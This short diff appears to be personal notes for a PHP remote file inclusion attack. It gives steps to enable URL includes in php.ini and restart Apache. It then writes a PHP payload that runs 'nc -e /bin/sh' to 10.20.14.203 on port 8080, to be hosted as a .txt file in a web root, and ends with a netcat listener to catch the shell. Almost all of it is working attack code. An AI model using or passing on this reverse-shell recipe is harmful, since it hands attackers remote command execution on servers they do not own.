@@ -1,0 +1,16 @@
+nano /etc/php5/cgi/php.ini
+sudo nano /etc/php5/cgi/php.ini
+ctrl + w
+allow_url
+ctrl + x
+
+sudo /etc/init.d/apache2 restart
+
+#leafpad
+<? php 
+passthru("nc -e/bin/sh 10.20.14.203 8080");
+
+?>
+#save it in var/www/html as reversr.txt
+
+nc -vv -l -p 8080
